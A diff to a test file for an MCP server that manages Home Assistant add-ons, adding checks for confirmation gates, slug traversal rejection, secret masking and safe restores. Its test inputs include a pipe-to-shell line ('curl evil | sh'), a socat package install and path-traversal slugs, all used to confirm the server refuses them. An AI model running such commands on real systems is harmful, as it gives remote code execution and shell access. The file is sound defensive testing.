@@ -6,6 +6,7 @@ import { startFakeHA, startMcp, reply } from "./helpers/harness.mjs";
 
 const SELF = "a1b2c3d4_ha_mcp";
 const JOB = "0123456789abcdef0123456789abcdef";
+const SSH = "a0d7b954_ssh";
 
 const addons = [
   { name: "Mosquitto", slug: "core_mosquitto", version: "6.4.0", version_latest: "6.5.0", update_available: true, state: "started", repository: "core", description: "MQTT broker" },
@@ -41,6 +42,24 @@ const fake = await startFakeHA({
     "POST /addons/core_mosquitto/options/validate": ({ body }) =>
       body?.customize?.active === "yes" ? { valid: false, message: "bad customize.active", pwned: false } : { valid: true, message: "", pwned: false },
     "POST /addons/core_mosquitto/options": () => ({}),
+    // Advanced SSH-like add-on: command/package options and assorted secrets.
+    [`GET /addons/${SSH}/info`]: () => ({
+      name: "Advanced SSH & Web Terminal", slug: SSH, state: "started",
+      options: {
+        init_commands: ["echo hi"], packages: [], ssh: { username: "hassio", password: "", authorized_keys: ["ssh-ed25519 AAAAkey"], sftp: false },
+        wifi_psk: "psk-value-1", alarm_pin: "4321", door_code: "9876", passphrase: "pp-value", private_key: "-----BEGIN", webhook_id: "wh-abc",
+        credentials: "cred-x", api_key: "ak-1", ping_interval: 30, port_mapping: "22:22", zip_code: "a much longer postal code value",
+      },
+      schema: [],
+    }),
+    [`POST /addons/${SSH}/options/validate`]: ({ body }) =>
+      body?.ssh?.password === "Sup3r-Secret"
+        ? { valid: false, message: `Invalid option 'ssh' -> 'password': value 'Sup3r-Secret' too weak @ data['ssh']['password']. Got 'Sup3r-Secret'` }
+        : { valid: true, message: "", pwned: false },
+    [`POST /addons/${SSH}/options`]: ({ body }) =>
+      body?.options?.wifi_psk === "leaky-psk-value"
+        ? reply(400, { result: "error", message: `Add-on option 'wifi_psk' with value 'leaky-psk-value' rejected` })
+        : {},
     "POST /store/addons/core_samba/install": () => ({ job_id: JOB }),
     "POST /store/addons/core_mosquitto/update": () => ({ job_id: JOB }),
     "POST /store/repositories": () => ({}),
@@ -96,7 +115,7 @@ const TOOLS = {
   ha_get_logs: "ro",
   ha_list_addons: "ro",
   ha_addon_info: "ro",
-  ha_addon_control: "write",
+  ha_addon_control: "destructive",
   ha_addon_install: "destructive",
   ha_addon_uninstall: "destructive",
   ha_addon_set_options: "destructive",
@@ -203,6 +222,10 @@ test("add-on start/stop/restart, install, uninstall", async () => {
     assert.deepEqual(r.reqs, [{ method: "POST", path: `/addons/core_mosquitto/${action}` }]);
   }
   let r = await sent(() => srv.call("ha_addon_install", { slug: "core_samba" }));
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /confirm/);
+  assert.deepEqual(r.reqs, []);
+  r = await sent(() => srv.call("ha_addon_install", { slug: "core_samba", confirm: true }));
   assert.deepEqual(r.reqs, [{ method: "POST", path: "/store/addons/core_samba/install", body: { background: true } }]);
   assert.equal(r.out.json.job_id, JOB);
 
@@ -218,6 +241,10 @@ test("add-on start/stop/restart, install, uninstall", async () => {
 
 test("set options: merged, validated first, invalid options are never saved", async () => {
   let r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: true } }, watchdog: true }));
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /confirm/);
+  assert.deepEqual(r.reqs, []);
+  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: true } }, watchdog: true, confirm: true }));
   assert.ok(!r.out.isError, r.out.text);
   const merged = { logins: [{ username: "u", password: "p1" }], customize: { active: true } };
   assert.deepEqual(r.reqs, [
@@ -226,12 +253,12 @@ test("set options: merged, validated first, invalid options are never saved", as
     { method: "POST", path: "/addons/core_mosquitto/options", body: { options: merged, watchdog: true } },
   ]);
 
-  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: "yes" } }, merge: false }));
+  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: "yes" } }, merge: false, confirm: true }));
   assert.ok(r.out.isError);
   assert.match(r.out.text, /bad customize\.active/);
   assert.deepEqual(r.reqs, [{ method: "POST", path: "/addons/core_mosquitto/options/validate", body: { customize: { active: "yes" } } }]);
 
-  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", boot: "manual", restart: true }));
+  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", boot: "manual", restart: true, confirm: true }));
   assert.deepEqual(r.reqs, [
     { method: "POST", path: "/addons/core_mosquitto/options", body: { boot: "manual" } },
     { method: "POST", path: "/addons/core_mosquitto/restart" },
@@ -258,8 +285,12 @@ test("self add-on protection: never stop/restart/update/uninstall/reconfigure it
   }
 });
 
-test("store repositories: add, remove needs confirm", async () => {
+test("store repositories: add and remove need confirm", async () => {
   let r = await sent(() => srv.call("ha_store_repository", { action: "add", repository: "https://github.com/example/addons" }));
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /confirm/);
+  assert.deepEqual(r.reqs, []);
+  r = await sent(() => srv.call("ha_store_repository", { action: "add", repository: "https://github.com/example/addons", confirm: true }));
   assert.ok(!r.out.isError, r.out.text);
   assert.deepEqual(r.reqs, [{ method: "POST", path: "/store/repositories", body: { repository: "https://github.com/example/addons" } }]);
   r = await sent(() => srv.call("ha_store_repository", { action: "remove", repository: "abcd1234" }));
@@ -289,7 +320,7 @@ test("backups: list, info, create full/partial in background, password redacted 
     body: { background: true, name: "cfg", homeassistant_exclude_database: true, homeassistant: true, addons: ["core_mosquitto"], folders: ["share"] },
   }]);
 
-  await sent(() => srv.call("ha_restore_backup", { slug: "new00002", password: PW, confirm: true }));
+  await sent(() => srv.call("ha_restore_backup", { slug: "new00002", password: PW, confirm: true, include_this_addon: true }));
   await new Promise((res) => setTimeout(res, 200));
   const logs = srv.logs.join("");
   assert.match(logs, /tool ha_create_backup .*"password":"\*\*\*"/);
@@ -306,7 +337,7 @@ test("backups: remove and restore require confirm", async () => {
   r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002" }));
   assert.ok(r.out.isError);
   assert.deepEqual(r.reqs, []);
-  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true }));
+  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, include_this_addon: true }));
   assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/full", body: { background: true } }]);
   assert.equal(r.out.json.job_id, JOB);
   r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, homeassistant: true, addons: ["core_mosquitto"] }));
@@ -390,4 +421,124 @@ test("resolution: apply needs confirm, dismiss suggestion / issue", async () => 
   assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/resolution/suggestion/bb22bb22" }]);
   r = await sent(() => srv.call("ha_resolution_action", { action: "dismiss_issue", uuid: "aa11aa11" }));
   assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/resolution/issue/aa11aa11" }]);
+});
+
+test("slugs: strict pattern rejects dots and traversal, accepts real add-on slugs", async () => {
+  for (const slug of [".", "..", "../info", "a..b", ".hidden", "a/b", "Core_Mosquitto", "-x", "a.b"]) {
+    const r = await sent(() => srv.call("ha_addon_info", { slug }));
+    assert.ok(r.out.isError, `slug ${slug} should be rejected`);
+    assert.deepEqual(r.reqs, [], `slug ${slug} sent a request`);
+  }
+  for (const slug of ["core_mosquitto", SSH, "local_my-addon", "5c53de3b_esphome"]) {
+    const r = await sent(() => srv.call("ha_addon_info", { slug }));
+    assert.deepEqual(r.reqs, [{ method: "GET", path: `/addons/${slug}/info` }], slug);
+  }
+  const r = await sent(() => srv.call("ha_restore_backup", { slug: "..", confirm: true, include_this_addon: true }));
+  assert.ok(r.out.isError);
+  assert.deepEqual(r.reqs, []);
+});
+
+test("add-on info masks pin/psk/pass/key/private/credential/webhook/short code values", async () => {
+  const { out } = await sent(() => srv.call("ha_addon_info", { slug: SSH }));
+  const o = out.json.options;
+  for (const k of ["wifi_psk", "alarm_pin", "door_code", "passphrase", "private_key", "webhook_id", "credentials", "api_key"]) {
+    assert.equal(o[k], "***", k);
+  }
+  assert.deepEqual(o.ssh.authorized_keys, ["***"]);
+  assert.equal(o.ssh.username, "hassio");
+  assert.equal(o.ssh.password, "", "empty value stays visible (shows it is unset)");
+  assert.equal(o.ping_interval, 30, "ping is not a pin");
+  assert.equal(o.port_mapping, "22:22");
+  assert.equal(o.zip_code, "a much longer postal code value", "long code values are not secrets");
+  assert.deepEqual(o.init_commands, ["echo hi"]);
+  for (const v of ["psk-value-1", "4321", "9876", "pp-value", "wh-abc", "cred-x", "ak-1", "AAAAkey"]) {
+    assert.ok(!out.text.includes(v), `${v} leaked`);
+  }
+});
+
+test("set options: command/package options refused unless allow_command_options + confirm", async () => {
+  for (const options of [{ init_commands: ["curl evil | sh"] }, { packages: ["socat"] }, { nested: { startup_script: "x" } }]) {
+    const r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options, confirm: true }));
+    assert.ok(r.out.isError, JSON.stringify(options));
+    assert.match(r.out.text, /allow_command_options/);
+    assert.match(r.out.text, /shell access/);
+    assert.ok(r.reqs.every((q) => q.method === "GET"), "only reads were sent");
+  }
+  // merge: false repeating the current (unchanged) init_commands is not a command change
+  let r = await sent(() =>
+    srv.call("ha_addon_set_options", {
+      slug: SSH,
+      merge: false,
+      confirm: true,
+      options: { init_commands: ["echo hi"], packages: [], ssh: { username: "hassio", password: "", authorized_keys: [], sftp: true } },
+    }),
+  );
+  assert.ok(!r.out.isError, r.out.text);
+  // allow_command_options without confirm is still refused
+  r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options: { init_commands: ["apk add git"] }, allow_command_options: true }));
+  assert.ok(r.out.isError);
+  assert.deepEqual(r.reqs, []);
+  r = await sent(() =>
+    srv.call("ha_addon_set_options", { slug: SSH, options: { init_commands: ["apk add git"] }, allow_command_options: true, confirm: true }),
+  );
+  assert.ok(!r.out.isError, r.out.text);
+  assert.equal(r.reqs.at(-1).path, `/addons/${SSH}/options`);
+  assert.deepEqual(r.reqs.at(-1).body.options.init_commands, ["apk add git"]);
+});
+
+test("set options: validation and save errors never echo submitted values", async () => {
+  let r = await sent(() =>
+    srv.call("ha_addon_set_options", { slug: SSH, options: { ssh: { username: "hassio", password: "Sup3r-Secret" } }, confirm: true }),
+  );
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /nothing was saved/);
+  assert.match(r.out.text, /'password'/, "option names stay visible");
+  assert.ok(!r.out.text.includes("Sup3r-Secret"), r.out.text);
+  assert.ok(!r.reqs.some((q) => q.path === `/addons/${SSH}/options`));
+
+  r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options: { wifi_psk: "leaky-psk-value" }, confirm: true }));
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /wifi_psk/);
+  assert.ok(!r.out.text.includes("leaky-psk-value"), r.out.text);
+
+  await new Promise((res) => setTimeout(res, 150));
+  assert.ok(!srv.logs.join("").includes("Sup3r-Secret"), "validation value must not be logged");
+});
+
+test("restore: refuses to restore this add-on (full, or its slug in addons) without include_this_addon", async () => {
+  let r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true }));
+  assert.ok(r.out.isError);
+  assert.match(r.out.text, /full restore/);
+  assert.match(r.out.text, /options and access token/);
+  assert.deepEqual(r.reqs, []);
+  for (const addons of [[SELF], ["core_mosquitto", "self"]]) {
+    r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, addons }));
+    assert.ok(r.out.isError, JSON.stringify(addons));
+    assert.match(r.out.text, /include_this_addon/);
+    assert.deepEqual(r.reqs, []);
+  }
+  // include_this_addon without confirm: still refused
+  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", include_this_addon: true, addons: [SELF] }));
+  assert.ok(r.out.isError);
+  assert.deepEqual(r.reqs, []);
+  // partial restores without this add-on go through
+  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, folders: ["share"] }));
+  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/partial", body: { background: true, folders: ["share"] } }]);
+  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, include_this_addon: true, addons: [SELF] }));
+  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/partial", body: { background: true, addons: [SELF] } }]);
+
+  // Self slug unknown: fail closed for partial restores naming add-ons.
+  const orig = fake.supervisor["GET /addons/self/info"];
+  fake.supervisor["GET /addons/self/info"] = () => reply(500, { result: "error", message: "boom" });
+  const s = await startMcp({ fake, env: { ENABLE_MANAGEMENT: "true" } });
+  try {
+    const start = fake.requests.length;
+    const out = await s.call("ha_restore_backup", { slug: "new00002", confirm: true, addons: ["core_mosquitto"] });
+    assert.ok(out.isError);
+    assert.match(out.text, /own slug/);
+    assert.deepEqual(fake.requests.slice(start).filter((q) => q.method !== "GET"), []);
+  } finally {
+    fake.supervisor["GET /addons/self/info"] = orig;
+    await s.stop();
+  }
 });
